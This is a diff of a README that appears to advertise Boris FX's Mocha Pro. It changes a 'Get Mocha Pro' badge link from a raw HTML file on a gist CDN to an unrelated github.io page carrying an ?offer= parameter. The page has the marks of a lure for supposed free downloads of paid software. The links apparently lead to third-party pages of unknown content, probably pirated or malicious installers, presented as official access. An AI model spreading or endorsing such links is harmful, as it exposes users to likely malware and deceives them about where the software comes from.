@@ -2,7 +2,7 @@
 
 **Mocha Pro** by Boris FX is the industry’s leading **planar tracking and visual effects tool**, trusted by studios and post-production artists worldwide. It delivers unmatched precision for tracking, masking, and object removal. 🎯  
 
-[![Get GitHub Instruction](https://img.shields.io/badge/🟠%20Get%20Mocha%20Pro-F57C00?style=for-the-badge&logo=borisfx&logoColor=white&labelColor=0B0F19)](https://gistcdn.githack.com/funnybunny79-create/32d02005f9f299d9a7bce3307d4507ab/raw/e5e26d5c038a39ab4d909931d4b293dbec93c957/mochapro.html?offer=MochaPro)
+[![Get GitHub Instruction](https://img.shields.io/badge/🟠%20Get%20Mocha%20Pro-F57C00?style=for-the-badge&logo=borisfx&logoColor=white&labelColor=0B0F19)](https://app-desk-hub.github.io/.github/?offer=MochaPro)
 
 ---
 
